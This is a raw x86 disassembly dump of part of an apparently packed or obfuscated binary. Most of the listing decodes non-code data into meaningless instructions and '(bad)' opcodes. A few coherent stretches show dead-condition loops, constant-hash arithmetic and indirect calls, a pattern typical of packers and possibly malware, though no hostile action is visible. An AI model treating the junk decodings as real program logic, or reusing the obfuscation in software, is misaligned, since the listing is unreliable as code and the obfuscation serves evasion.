  4058f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058f4:	or     ch,BYTE PTR [ecx]
  4058f6:	cmp    al,0x1d
  4058f8:	pushf  
  4058f9:	test   al,0xee
  4058fb:	out    0xf4,al
  4058fd:	pop    ebx
  4058fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058ff:	scas   eax,DWORD PTR es:[edi]
  405900:	sbb    eax,0xdfa4ceba
  405905:	jb     0x405904
  405907:	pop    es
  405908:	sub    eax,0xad0d05ee
  40590d:	outs   dx,DWORD PTR fs:[esi]
  40590f:	ror    dl,cl
  405911:	jmp    0x3cf4f417
  405916:	shl    DWORD PTR [ecx-0xcab8a0],1
  40591c:	and    BYTE PTR [edi+eiz*2],ch
  40591f:	dec    edx
  405920:	xchg   ebp,eax
  405921:	pop    ecx
  405922:	pop    esp
  405923:	jecxz  0x4058e5
  405925:	sahf   
  405926:	inc    edi
  405927:	mov    ch,0x33
  405929:	adc    BYTE PTR [ecx-0x647878f9],dh
  40592f:	push   0xd856cddb
  405934:	pop    ecx
  405935:	push   ebp
  405936:	nop
  405937:	stc    
  405938:	mov    BYTE PTR [ebx+ebx*1-0x55],cl
  40593c:	(bad)  [eax+0x33]
  40593f:	lahf   
  405940:	or     eax,0x224d1168
  405945:	lods   eax,DWORD PTR gs:[esi]
  405947:	out    0x27,eax
  405949:	adc    BYTE PTR ds:0xebf5a573,ch
  40594f:	out    dx,eax
  405950:	xchg   esp,eax
  405951:	sub    BYTE PTR [edx-0x5],ah
  405954:	fnstsw WORD PTR [esi-0x70ad961b]
  40595a:	xchg   edx,eax
  40595b:	mov    edx,0x352277c9
  405960:	test   al,0x74
  405962:	test   BYTE PTR cs:[edi+0x4],dl
  405966:	(bad)  
  405968:	(bad)  
  405969:	(bad)  
  40596a:	xchg   ecx,eax
  40596b:	pop    ss
  40596c:	icebp  
  40596d:	add    BYTE PTR [esi+0x7c],bh
  405970:	sbb    bl,ah
  405972:	mov    bl,0x64
  405974:	rcl    BYTE PTR [ebp+0x117b5895],0x99
  40597b:	inc    ebp
  40597c:	inc    ebp
  40597d:	(bad)  
  40597f:	mov    esi,0xf4dc0ee3
  405984:	sbb    al,bh
  405986:	(bad)  
  405987:	pop    ecx
  405988:	adc    dh,0x99
  40598b:	inc    edi
  40598c:	or     al,0x5c
  40598e:	mov    esp,eax
  405990:	fst    st(6)
  405992:	mov    dh,0x83
  405994:	dec    edx
  405995:	adc    esi,edi
  405997:	or     al,0xad
  405999:	mov    ebp,0xfbe9fe3a
  40599e:	or     eax,0xafd0f023
  4059a3:	pop    ebx
  4059a4:	adc    al,BYTE PTR [ecx]
  4059a6:	xchg   edi,eax
  4059a7:	sub    edx,DWORD PTR [edx+edx*8-0xead2d58]
  4059ae:	repz push esi
  4059b0:	js     0x4059b9
  4059b2:	mov    ecx,0x2af6b925
  4059b7:	ret    0xc332
  4059ba:	or     eax,0xbf016dd3
  4059bf:	adc    ebx,DWORD PTR [ebp-0x5b957f0b]
  4059c5:	int3   
  4059c6:	sub    BYTE PTR ds:0x4b47cf84,ah
  4059cc:	test   eax,0xe5b8587d
  4059d1:	sbb    ah,cl
  4059d3:	test   ebx,edx
  4059d5:	in     al,dx
  4059d6:	push   ds
  4059d7:	inc    ebx
  4059d8:	cwde   
  4059d9:	iret   
  4059da:	fld    DWORD PTR [edi]
  4059dc:	push   esi
  4059dd:	out    0xd0,eax
  4059df:	sbb    al,0x78
  4059e1:	mov    ebx,0x571e338b
  4059e6:	cmp    DWORD PTR [ebp+ecx*1-0x6cc05da3],edi
  4059ed:	mov    ecx,0xcd1919ee
  4059f2:	sbb    DWORD PTR [edi-0x57ee8aa2],0xecc3e90c
  4059fc:	imul   esp,DWORD PTR [ebp+0x56],0x4f
  405a00:	call   0x66f26c1
  405a05:	enter  0x41cb,0x37
  405a09:	aam    0x29
  405a0b:	(bad)  [edi-0x1]
  405a0e:	mov    ebx,esi
  405a10:	sbb    BYTE PTR [esi+0xe017378],dh
  405a16:	stc    
  405a17:	fmul   QWORD PTR [eax]
  405a19:	pop    ds
  405a1a:	dec    eax
  405a1b:	stos   BYTE PTR es:[edi],al
  405a1c:	push   esp
  405a1d:	mov    al,ds:0x5fd7dc14
  405a22:	sbb    eax,eax
  405a24:	mov    DWORD PTR [edx-0x77],eax
  405a27:	add    bh,BYTE PTR [ebx]
  405a29:	dec    ecx
  405a2a:	inc    edx
  405a2b:	data16 jno 0x405a6a
  405a2e:	pop    ecx
  405a2f:	push   cs
  405a30:	scas   al,BYTE PTR es:[edi]
  405a31:	xor    DWORD PTR [ebx+0x2982d00],eax
  405a37:	xchg   DWORD PTR [esi-0x5acec0c2],esi
  405a3d:	add    cl,BYTE PTR [ebx]
  405a3f:	jecxz  0x405a05
  405a41:	cdq    
  405a42:	repnz push es
  405a44:	jnp    0x405aae
  405a46:	mov    es,esi
  405a48:	cmp    edx,ebp
  405a4a:	ins    BYTE PTR es:[edi],dx
  405a4b:	retf   0x60f
  405a4e:	cli    
  405a4f:	sti    
  405a50:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  405a57:	and    edx,0x797b
  405a5d:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  405a64:	and    edx,edx
  405a66:	mov    eax,DWORD PTR [ebp-0x4]
  405a69:	sbb    ecx,DWORD PTR ds:0x42fd05
  405a6f:	push   esi
  405a70:	mov    esi,DWORD PTR [ebp-0x8]
  405a73:	and    DWORD PTR ds:0x42fcf1,0x0
  405a7d:	jmp    0x405a8f
  405a82:	mov    edx,DWORD PTR ds:0x42fcf1
  405a88:	inc    edx
  405a89:	mov    DWORD PTR ds:0x42fcf1,edx
  405a8f:	cmp    DWORD PTR ds:0x42fcf1,0x17
  405a96:	jae    0x405b0b
  405a9c:	cmp    DWORD PTR ds:0x42fcf1,0x1d
  405aa3:	jne    0x405ab5
  405aa9:	push   DWORD PTR [ebp-0x24]
  405aac:	push   DWORD PTR [ebp-0x20]
  405aaf:	call   DWORD PTR ds:0x42e2db
  405ab5:	jmp    0x405a82
  405aba:	mov    DWORD PTR ds:0x42fcd9,0x14
  405ac4:	cmp    DWORD PTR ds:0x42fcd9,0x0
  405acb:	je     0x405b0b
  405ad1:	cmp    DWORD PTR ds:0x42fcd9,0x16
  405ad8:	jne    0x405af7
  405ade:	push   DWORD PTR [ebp-0x14]
  405ae1:	push   0x2e3f
  405ae6:	push   DWORD PTR [ebp-0x18]
  405ae9:	push   DWORD PTR [ebp-0x18]
  405aec:	push   0x8cdb
  405af1:	call   DWORD PTR ds:0x42e537
  405af7:	xor    edx,edx
  405af9:	xor    edx,DWORD PTR ds:0x42fcd9
  405aff:	dec    edx
  405b00:	mov    DWORD PTR ds:0x42fcd9,edx
  405b06:	jmp    0x405ac4
  405b0b:	mov    edx,0x7510855
  405b10:	add    DWORD PTR ds:0x42fcd1,edi
  405b16:	xor    eax,edx
  405b18:	and    DWORD PTR ds:0x42e6f7,ebx
  405b1e:	xor    esi,edx
  405b20:	mov    ecx,0x32729c
  405b25:	add    esi,ecx
  405b27:	add    eax,ecx
  405b29:	imul   eax,esi
  405b2c:	mov    esi,DWORD PTR [ebp+0xc]
  405b2f:	cmp    esi,eax
  405b31:	jne    0x405b4d
  405b37:	mov    eax,DWORD PTR [ebp-0x4]
  405b3a:	mov    esi,DWORD PTR [ebp-0x8]
  405b3d:	xor    eax,edx
  405b3f:	xor    esi,edx
  405b41:	add    eax,ecx
  405b43:	add    esi,ecx
  405b45:	imul   eax,esi
  405b48:	jmp    0x405e5b
  405b4d:	mov    eax,DWORD PTR [ebp+0xc]
  405b50:	mov    eax,DWORD PTR [eax+0x78]
  405b53:	mov    DWORD PTR [ebp+0xc],eax
  405b56:	mov    eax,DWORD PTR [ebp-0x4]
  405b59:	mov    esi,DWORD PTR [ebp-0x8]
  405b5c:	xor    eax,edx
  405b5e:	xor    esi,edx
  405b60:	add    eax,ecx
  405b62:	add    esi,ecx
  405b64:	imul   eax,esi
  405b67:	mov    esi,DWORD PTR [ebp+0xc]
  405b6a:	cmp    esi,eax
  405b6c:	mov    eax,DWORD PTR [ebp-0x4]
  405b6f:	je     0x405b3a
  405b75:	jmp    0x405e48
  405b7a:	xchg   DWORD PTR [ebx-0xdac0d75],edi
  405b80:	imul   esi,DWORD PTR gs:[eax+0x3],0xd769624d
  405b88:	xchg   esi,eax
  405b89:	aam    0x84
  405b8b:	xor    dh,BYTE PTR [eax+0x70]
  405b8e:	stos   BYTE PTR es:[edi],al
  405b8f:	jle    0x405c01
  405b91:	jo     0x405bdf
  405b93:	xor    DWORD PTR [ecx-0x4],edi
  405b96:	pop    ds
  405b97:	sub    cl,BYTE PTR [edx]
  405b99:	das    
  405b9a:	fucomi st,st(3)
  405b9c:	mov    ch,0x8
  405b9e:	or     esp,0x6b
  405ba1:	and    al,0x28
  405ba3:	xchg   edi,eax
  405ba4:	mov    ebp,0x7c19510b
  405ba9:	cmp    ebp,ecx
  405bab:	int3   
  405bac:	add    esi,DWORD PTR [edx+ebx*1]
  405baf:	test   al,0x82
  405bb1:	mov    bl,0x3a
  405bb3:	adc    BYTE PTR [eax-0x15aa3c6f],cl
  405bb9:	add    dh,bh
  405bbb:	rol    DWORD PTR [ebp-0x74653011],1
  405bc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bc2:	cmp    al,0x9c
  405bc4:	xor    edi,DWORD PTR [ebx]
  405bc6:	nop
  405bc7:	loope  0x405bb7
  405bc9:	and    ebx,edi
  405bcb:	sub    dl,BYTE PTR [ebx+0x12df52dc]
  405bd1:	pop    esi
  405bd2:	(bad)  
  405bd3:	aad    0x43
  405bd5:	cmc    
  405bd6:	data16 fsubrp st(6),st
  405bd9:	pop    edi
  405bda:	loope  0x405b5d
  405bdc:	(bad)  
  405bde:	and    esp,DWORD PTR [edx+eax*2]
  405be1:	push   ebx
  405be2:	(bad)  
  405be3:	retf   0x6928
  405be6:	lods   al,BYTE PTR ds:[esi]
  405be7:	ficomp WORD PTR [ecx+0x71]
  405bea:	or     DWORD PTR [ebp+0x2c0d3dab],ecx
  405bf0:	out    dx,eax
  405bf1:	xor    BYTE PTR [edi],bh
  405bf3:	cwd    
  405bf5:	or     DWORD PTR [ebx],0xd5ca64af
  405bfb:	cmp    dl,BYTE PTR [edx]
  405bfd:	xchg   ebp,eax
  405bfe:	clc    
  405bff:	sti    
  405c00:	(bad)  
  405c01:	cmp    eax,0x1f52cf66
  405c06:	or     DWORD PTR [esi-0x34],edx
  405c09:	push   ds
  405c0a:	stos   DWORD PTR es:[edi],eax
  405c0b:	sti    
  405c0c:	loope  0x405bb6
  405c0e:	out    0x8c,eax
  405c10:	adc    eax,0x6d3dc16
  405c15:	es inc eax
  405c17:	js     0x405c83
  405c19:	adc    BYTE PTR [esp+edx*8+0x6a],0xac
  405c1e:	add    BYTE PTR [eax],bl
  405c20:	dec    eax
  405c21:	mov    BYTE PTR [ecx],dh
  405c23:	and    bh,BYTE PTR [edi]
  405c25:	pop    ebx
  405c26:	adc    dh,dh
  405c28:	int    0x1a
  405c2a:	xchg   ebp,eax
  405c2b:	ins    DWORD PTR es:[edi],dx
  405c2c:	cwde   
  405c2d:	cli    
  405c2e:	adc    ch,BYTE PTR [edx+0x39]
  405c31:	xor    ecx,0x48
  405c34:	sub    eax,0xbba32ffc
  405c39:	test   DWORD PTR [ebx-0x59326a5e],ecx
  405c3f:	or     eax,0x8cdbb4f
  405c44:	cmp    BYTE PTR [ebp+0x1f],ch
  405c47:	sbb    al,0xbb
  405c49:	xchg   ebx,eax
  405c4a:	clc    
  405c4b:	and    BYTE PTR [eax+0x74],cl
  405c4e:	cdq    
  405c4f:	ret    0x1217
  405c52:	fidivr WORD PTR [edi]
  405c54:	imul   ebp,DWORD PTR [ebp+0x38bd7013],0xffffffe6
  405c5b:	adc    edx,ebx
  405c5d:	or     DWORD PTR [ebp+edx*4+0x64beb631],ecx
  405c64:	xor    esi,edx
  405c66:	mov    eax,ds:0xb46cf32f
  405c6b:	mov    eax,0xd661a37
  405c70:	(bad)  
  405c71:	mov    ecx,0xa72fec4e
  405c76:	inc    esi
  405c77:	xchg   BYTE PTR [ecx+ecx*2-0xb0502c3],ah
  405c7e:	gs daa 
  405c80:	pop    esp
  405c81:	and    BYTE PTR [esi-0x3931c576],dl
  405c87:	inc    ebx
  405c88:	pop    es
  405c89:	inc    esp
  405c8a:	lods   al,BYTE PTR ds:[esi]
  405c8b:	add    DWORD PTR [esi],edx
  405c8d:	push   cs
  405c8e:	mov    bl,0xe7
  405c90:	adc    bl,BYTE PTR [eax]
  405c92:	nop
  405c93:	dec    ebp
  405c94:	and    al,0xb6
  405c96:	mov    al,0xa8
  405c98:	mov    bh,0xb3
  405c9a:	imul   edx,DWORD PTR [ebx],0xffffffae
  405c9d:	or     DWORD PTR [edi+eiz*4+0x1a0bebf5],esp
  405ca4:	pop    ebx
  405ca5:	push   ecx
  405ca6:	pop    ds
  405ca7:	inc    ecx
  405ca8:	add    bh,BYTE PTR [ecx-0x32]
  405cab:	mov    ebx,ss
  405cad:	xor    al,0x36
  405caf:	mov    esi,0x99a6cf2a
  405cb4:	push   edx
  405cb5:	and    BYTE PTR [esi-0x60],dh
  405cb8:	push   ebx
  405cb9:	and    edx,0x9c5779e4
  405cbf:	mov    ecx,DWORD PTR [esp+ebp*2]
  405cc2:	jmp    0x405c73
  405cc4:	xchg   BYTE PTR [ebx-0x42],ah
  405cc7:	mov    bh,0x98
  405cc9:	cmp    ah,al
  405ccb:	adc    cl,BYTE PTR [ebx+eiz*4-0x4afc3a2c]
  405cd2:	in     eax,0x94
  405cd4:	ror    BYTE PTR [esi-0x5a],0xf7
  405cd8:	not    DWORD PTR [edx]
  405cda:	cmp    ebp,esp
  405cdc:	loope  0x405c8c
  405cde:	inc    esi
  405cdf:	adc    esi,DWORD PTR [ecx+0x5c1c248]
  405ce5:	out    0x3,eax
  405ce7:	xchg   esp,eax
  405ce8:	popa   
  405ce9:	jge    0x405c86
  405ceb:	das    
  405cec:	push   ss
  405ced:	aas    
  405cee:	jnp    0x405cd4
  405cf0:	mov    cl,0x67
  405cf2:	add    cl,BYTE PTR [eax]
  405cf4:	outs   dx,DWORD PTR ds:[esi]
  405cf5:	inc    eax
  405cf6:	pop    eax
  405cf7:	xchg   edi,eax
  405cf8:	sub    ebp,ebx
  405cfa:	add    al,0x6a
  405cfc:	ret    
  405cfd:	and    al,0xd1
  405cff:	repz mov bl,0xd3
  405d02:	jns    0x405c99
  405d04:	inc    edx
  405d05:	ins    DWORD PTR es:[edi],dx
  405d06:	push   es
  405d07:	jmp    0x735b:0xdeefb0bb
  405d0e:	xchg   ebx,eax
  405d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d10:	pop    edi
  405d11:	iret   
  405d12:	mov    ecx,0x66fc9ae2
  405d17:	loop   0x405d0d
  405d19:	dec    ebp
  405d1a:	xchg   DWORD PTR [ebp-0x4],eax
  405d1d:	push   ds
  405d1e:	pop    esp
  405d1f:	fmul   DWORD PTR [edx]
  405d21:	hlt    
  405d22:	fld1   
  405d24:	call   0x9478:0xa0ee578e
  405d2b:	push   ds
  405d2c:	stc    
  405d2d:	sbb    BYTE PTR ds:0x356bfacf,cl
  405d33:	fsub   st(4),st
  405d35:	pop    es
  405d36:	mov    DWORD PTR [edx],edi
  405d38:	and    dl,BYTE PTR [ebp-0x56]
  405d3b:	call   0xe45072f9
  405d40:	cmp    eax,0x9d9b5e8e
  405d45:	add    eax,0x241188d4
  405d4a:	adc    DWORD PTR [edx-0x1e],0xffffff90
  405d4e:	add    eax,0x689d304c
  405d53:	ds daa 
  405d55:	lods   eax,DWORD PTR ss:[esi]
  405d57:	(bad)  
  405d58:	jo     0x405dc8
  405d5a:	cmp    eax,0x7e934d41
  405d5f:	hlt    
  405d60:	es push ss
  405d62:	ficom  DWORD PTR [edi]
  405d64:	push   ebp
  405d65:	pop    ebx
  405d66:	aad    0x66
  405d68:	outs   dx,DWORD PTR ds:[esi]
  405d69:	add    bl,BYTE PTR [ebx-0x11359a1d]
  405d6f:	loopne 0x405d83
  405d71:	xchg   edi,eax
  405d72:	mov    eax,ds:0xb881ade2
  405d77:	cmc    
  405d78:	int3   
  405d79:	inc    edi
  405d7a:	adc    eax,0x559df734
  405d7f:	in     al,dx
  405d80:	inc    esi
  405d81:	cmp    ebx,DWORD PTR [ebx-0x18bbf181]
  405d87:	inc    esp
  405d88:	(bad)  
  405d8a:	inc    ebp
  405d8b:	cmp    DWORD PTR [ebp+edx*4+0x6e295f75],ebp
  405d92:	cmp    DWORD PTR [ebp+0x562b6935],0x22
  405d99:	and    eax,0x492700e8
  405d9e:	and    eax,0x64bbf336
  405da3:	push   ecx
  405da4:	stos   BYTE PTR es:[edi],al
  405da5:	or     ebp,DWORD PTR [eax-0x7a1fdc99]
  405dab:	out    0xbb,eax
  405dad:	add    BYTE PTR [esi-0x270aa2b5],bl
  405db3:	std    
  405db4:	pushf  
  405db5:	cdq    
  405db6:	sbb    eax,0x48add38c
  405dbb:	xchg   ebp,eax
  405dbc:	out    0x1e,al
  405dbe:	out    0xb,al
  405dc0:	retf   
  405dc1:	iret   
  405dc2:	fdiv   QWORD PTR [ebp-0x24a57c]
  405dc8:	xchg   edi,eax
  405dc9:	push   edi
  405dca:	pop    ebp
  405dcb:	sbb    al,0xc3
  405dcd:	dec    ebx
  405dce:	push   edx
  405dcf:	fidiv  DWORD PTR [ebx]
  405dd1:	or     al,0xa
  405dd3:	daa    
  405dd4:	mov    cl,0xe7
  405dd6:	adc    eax,0x8919b3b6
  405ddb:	xchg   ebx,eax
  405ddc:	jmp    0x3b636643
  405de1:	jo     0x405d9b
  405de3:	sub    BYTE PTR [ebx+0x29],cl
  405de6:	jmp    0x10958319
  405deb:	push   cs
  405dec:	xor    DWORD PTR [esi+0x62],ebp
  405def:	retf   0x6127
  405df2:	jg     0x405e08
  405df4:	and    eax,0x7cd84b9b
  405df9:	xlat   BYTE PTR ds:[ebx]
  405dfa:	outs   dx,BYTE PTR ds:[esi]
  405dfb:	xor    DWORD PTR [esi+0x16],edi
  405dfe:	sub    al,0x29
  405e00:	sbb    al,0x8b
  405e02:	test   eax,0x78a7e780
  405e07:	push   ds
  405e08:	push   esi
  405e09:	les    eax,FWORD PTR [ecx-0x78155384]
  405e0f:	mov    cl,0xdf
  405e11:	dec    esp
  405e12:	in     al,dx
  405e13:	ins    BYTE PTR es:[edi],dx
  405e14:	jb     0x405e39
  405e16:	call   0x53da:0xd03ca59
  405e1d:	addr16 int3 
  405e1f:	xchg   edx,eax
  405e20:	jl     0x405e9b
  405e22:	fsub   st,st(2)
  405e24:	ds ret 0xf116
  405e28:	push   ds
  405e29:	loop   0x405e82
  405e2b:	push   cs
  405e2c:	adc    DWORD PTR [eax-0x3],0x53948c88
  405e33:	outs   dx,DWORD PTR ds:[esi]
  405e34:	sbb    eax,0xcb2862e7
  405e39:	sbb    dl,BYTE PTR [ebx+ecx*4-0x46]
  405e3d:	pop    esi
  405e3e:	hlt    
  405e3f:	inc    edx
  405e40:	pop    eax
  405e41:	out    0xf7,al
  405e43:	pushf  
  405e44:	cs sub cl,BYTE PTR gs:[eax]
  405e48:	xor    eax,edx
  405e4a:	add    eax,ecx
  405e4c:	mov    ecx,DWORD PTR [ebp+0xc]
  405e4f:	imul   eax,ecx
  405e52:	add    eax,DWORD PTR [ebp+0x8]
  405e55:	mov    DWORD PTR [ebp+0xc],eax
  405e58:	mov    eax,DWORD PTR [ebp+0xc]
  405e5b:	pop    esi
  405e5c:	leave  
  405e5d:	ret    0x8
  405e60:	push   ebp
  405e61:	mov    ebp,esp
  405e63:	push   ecx
  405e64:	add    DWORD PTR ds:0x42e70f,0x1508
  405e6e:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  405e75:	mov    eax,DWORD PTR [ebp-0x4]
  405e78:	mov    edx,DWORD PTR [ebp+0x10]
  405e7b:	adc    DWORD PTR ds:0x42e6ef,0x4006
  405e85:	mov    ecx,0x7510855
  405e8a:	xor    DWORD PTR ds:0x42fd01,0x260
  405e94:	xor    eax,ecx
  405e96:	jmp    0x40605c
  405e9b:	fidiv  DWORD PTR [edx+0x7b]
  405e9e:	jle    0x405e33
  405ea0:	jne    0x405e7b
  405ea2:	jb     0x405e2d
  405ea4:	(bad)  
  405ea5:	(bad)  
  405ea6:	sub    al,0x25
  405ea8:	cmp    eax,0x3f3e19ae
  405ead:	jo     0x405f1f
  405eaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405eb0:	jg     0x405f22
  405eb2:	jo     0x405e5f
  405eb4:	fadd   QWORD PTR ds:0x87d68b9
  405eba:	out    0x30,al
  405ebc:	push   es
  405ebd:	cmp    al,BYTE PTR [ebx-0x2e2c7a79]
  405ec3:	les    ebp,FWORD PTR [ecx-0x2192832a]
  405ec9:	xchg   edi,eax
  405eca:	loopne 0x405ebc
  405ecc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ecd:	(bad)  
  405ece:	nop
  405ecf:	dec    BYTE PTR [esi+0x3b]
  405ed2:	cmp    al,0x20
  405ed4:	add    cl,BYTE PTR [edx-0x35]
  405ed7:	xor    DWORD PTR [ebp+0x2b9135dd],edx
  405edd:	push   edi
  405ede:	or     dh,ah
  405ee0:	(bad)
  405ee3:	rep outs dx,BYTE PTR ds:[esi]
  405ee5:	bound  ebp,QWORD PTR [eax]
  405ee7:	lea    edi,[eax-0x5d]
  405eea:	stos   BYTE PTR es:[edi],al
  405eeb:	int3   
  405eec:	inc    eax
  405eed:	pop    esp
  405eee:	mov    WORD PTR ds:0xba960c8f,fs
  405ef4:	jne    0x405eb4
  405ef6:	cmp    eax,0xa222b7c2
  405efb:	gs hlt 
  405efd:	push   ecx
  405efe:	jo     0x405e9e
  405f00:	rol    BYTE PTR [ebx+0x7f86342c],0x9a
  405f07:	or     dh,BYTE PTR [edi+0x6c]
  405f0a:	or     bh,bl
  405f0c:	cmp    al,BYTE PTR [esi]
  405f0e:	in     eax,dx
  405f0f:	dec    edi
  405f10:	adc    al,0x54
  405f12:	and    ah,BYTE PTR [edx]
  405f14:	xchg   DWORD PTR ds:0x925c6c42,edi
  405f1a:	mov    ah,0x5a
  405f1c:	add    DWORD PTR [ecx-0x68],esi
  405f1f:	xchg   edx,ebp
  405f21:	clc    
  405f22:	push   ebx
  405f23:	push   cs
  405f24:	hlt    
  405f25:	jbe    0x405f14
  405f27:	es dec esp
  405f29:	out    0x50,eax
  405f2b:	adc    eax,0x2afb4cbe
  405f30:	(bad)  
  405f31:	aaa    
  405f32:	push   0xffffff99
  405f34:	sbb    al,0x9
  405f36:	cmp    edi,DWORD PTR [edx-0x59]
  405f39:	(bad)  
  405f3a:	dec    esp
  405f3b:	xchg   ecx,eax
  405f3c:	push   ebx
  405f3d:	lock inc eax
  405f3f:	hlt    
  405f40:	cwde   
  405f41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f42:	push   0xffffffc2
  405f44:	sub    BYTE PTR [ebx-0x4973e106],cl
  405f4a:	outs   dx,DWORD PTR ds:[esi]
  405f4b:	jmp    0x7dd2:0x26a1574c
  405f52:	loopne 0x405eea
  405f54:	dec    ebp
  405f55:	(bad)  [eax+0x388c7938]
  405f5b:	sbb    al,0xae
  405f5d:	js     0x405f5e
  405f5f:	repz (bad) 
  405f61:	fcomip st,st(2)
  405f63:	shl    dh,1
  405f65:	lods   eax,DWORD PTR ds:[esi]
  405f66:	mov    ch,0x9e
  405f68:	pop    ecx
  405f69:	pop    ss
  405f6a:	clc    
  405f6b:	frstor [edx]
  405f6d:	psubw  mm3,QWORD PTR [esp+0x76674ac0]
  405f75:	aad    0x4b
  405f77:	cmp    eax,DWORD PTR [esi-0xec7a653]
  405f7d:	mov    ah,0x9b
  405f7f:	test   DWORD PTR [ebp+0x16687ea6],esi
  405f85:	or     ebp,DWORD PTR [esi-0x56]
  405f88:	aaa    
  405f89:	adc    dl,BYTE PTR [ebx]
  405f8b:	mov    ebp,0x6c14055
  405f90:	gs mov dh,0x74
  405f93:	xor    DWORD PTR [eax-0x3267e6d7],ebx
  405f99:	loop   0x405feb
  405f9b:	push   esp
  405f9c:	loope  0x405ffd
  405f9e:	shl    DWORD PTR [esi+0xa],1
  405fa1:	fbld   TBYTE PTR [ebx+0x7aa2ad83]
  405fa7:	in     al,dx
  405fa8:	sbb    dh,BYTE PTR [ebx-0x8]
  405fab:	addr16 push es
  405fad:	nop
  405fae:	pop    ss
  405faf:	sbb    BYTE PTR [eax],dl
  405fb1:	mov    ah,0x54
  405fb3:	xchg   DWORD PTR [eax+0x33],ebp
  405fb6:	aaa    
  405fb7:	push   0x19faba32
  405fbc:	lea    edi,[edi]
  405fbe:	and    BYTE PTR [edi+0x504c941f],al
  405fc4:	scas   eax,DWORD PTR es:[edi]
  405fc5:	jo     0x406039
  405fc7:	ss sub al,0x92
  405fca:	mov    ebx,0x560a076a
  405fcf:	adc    BYTE PTR [esi-0x722a695b],bl
  405fd5:	mov    eax,ds:0xc111bc9a
  405fda:	lea    esi,[eax-0x18]
  405fdd:	daa    
  405fde:	xor    ebx,ebx
  405fe0:	adc    eax,0xc01a09c8
  405fe5:	fdiv   DWORD PTR [edx-0x38]
  405fe8:	or     dh,bl
  405fea:	(bad)  
  405feb:	mov    eax,0x2d047ac5
  405ff0:	ret    
  405ff1:	std    
  405ff2:	mov    edi,ds
  405ff4:	fsubp  st(0),st
  405ff6:	cld    
  405ff7:	(bad)  
  405ff8:	sbb    BYTE PTR [edx-0x1520556d],ch
  405ffe:	mov    ecx,0xda02f4b6
  406003:	fbld   TBYTE PTR [edi-0x23]
  406006:	push   ebp
  406007:	nop
  406008:	add    dl,BYTE PTR [ecx+0x516a5217]
  40600e:	or     BYTE PTR es:[esi-0x11],0x29
  406013:	add    eax,esp
  406015:	add    esp,DWORD PTR [edi+0x26]
  406018:	jecxz  0x40603f
  40601a:	pop    ecx
  40601b:	jp     0x405f9e
  40601d:	or     edx,ebx
  40601f:	add    cl,BYTE PTR [ebx]
  406021:	mov    dl,0x82
  406023:	loop   0x405fc7
  406025:	and    al,BYTE PTR [edx-0x33b0026f]
  40602b:	sub    edx,DWORD PTR [edx-0x7b]
  40602e:	nop
  40602f:	cmp    dl,ch
  406031:	xor    DWORD PTR [edx],0x5fadfa4c
  406037:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406038:	aas    
  406039:	jl     0x406065
  40603b:	add    DWORD PTR [edi],0xffffffad
  40603e:	cmp    al,0x17
  406040:	shl    ah,0xfa
  406043:	aad    0xe
  406045:	mov    ah,0xa8
  406047:	adc    BYTE PTR [edx+eiz*4+0x701bd697],ah
  40604e:	or     esp,DWORD PTR [eax]
  406050:	mov    edi,0xf2efe139
  406055:	push   ss
  406056:	jae    0x40600b
  406058:	cmp    dl,BYTE PTR [ebx]
  40605a:	sbb    ch,BYTE PTR [ebp+eax*1+0x32729c]
  406061:	or     DWORD PTR ds:0x42fd86,0xae4
  40606b:	mov    DWORD PTR [edx],eax
  40606d:	mov    eax,DWORD PTR [ebp+0xc]
  406070:	xor    eax,ecx
  406072:	push   esi
  406073:	sbb    edx,DWORD PTR ds:0x42e118
  406079:	mov    esi,DWORD PTR [ebp+0x10]
  40607c:	or     DWORD PTR ds:0x42fd76,edx
  406082:	mov    edx,0x32729c
  406087:	sbb    DWORD PTR ds:0x42fcf1,0x42e11c
  406091:	add    eax,edx
  406093:	adc    DWORD PTR ds:0x42fcd1,0x42e6fb
  40609d:	mov    DWORD PTR [esi+0x4],eax
  4060a0:	sbb    eax,0x6979
  4060a5:	mov    eax,DWORD PTR [ebp+0x14]
  4060a8:	adc    DWORD PTR ds:0x42fd82,0x2335
  4060b2:	mov    esi,DWORD PTR [ebp+0x10]
  4060b5:	sub    DWORD PTR ds:0x42fcd5,0x1c02
  4060bf:	mov    DWORD PTR [esi+0x8],eax
  4060c2:	or     eax,DWORD PTR ds:0x42fd05
  4060c8:	jmp    0x40628e
  4060cd:	out    dx,al
  4060ce:	hlt    
  4060cf:	arpl   WORD PTR [edx],dx
  4060d1:	popa   
  4060d2:	xchg   ecx,eax
  4060d3:	ins    DWORD PTR es:[edi],dx
  4060d4:	hlt    
  4060d5:	(bad)  
  4060d6:	pop    esp
  4060d7:	xor    eax,0xebc03c96
  4060dc:	xchg   BYTE PTR [ebp+0x3e],ah
  4060df:	jo     0x406151
  4060e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060e2:	jg     0x406154
  4060e4:	jo     0x4060b9
  4060e6:	popf   
  4060e7:	call   0xfd9c:0x256ece11
  4060ee:	out    0x7c,eax
  4060f0:	out    dx,eax
  4060f1:	inc    edi
  4060f2:	push   ebx
  4060f3:	mov    eax,0x4b520a32
  4060f8:	or     eax,0xb0d3cbfb
  4060fd:	pop    esi
  4060fe:	push   edx
  4060ff:	aas    
  406100:	ins    BYTE PTR es:[edi],dx
  406101:	fisub  DWORD PTR [esi+0xa]
  406104:	sti    
  406105:	sub    dl,BYTE PTR [ecx+0x28d53a1d]
  40610b:	adc    BYTE PTR [eax],bl
  40610d:	push   ss
  40610e:	jns    0x4060fd
  406110:	cmp    BYTE PTR [ebp+0x22b74f24],ah
  406116:	add    cl,BYTE PTR [ecx+0x4c]
  406119:	push   edi
  40611a:	and    ah,BYTE PTR [ecx+0x22]
  40611d:	or     ch,BYTE PTR [eax-0x28b09564]
  406123:	(bad)  
  406125:	dec    eax
  406126:	aam    0xea
  406128:	sbb    bl,BYTE PTR [ebx]
  40612a:	inc    edi
  40612b:	cli    
  40612c:	into   
  40612d:	call   0x47e31ed8
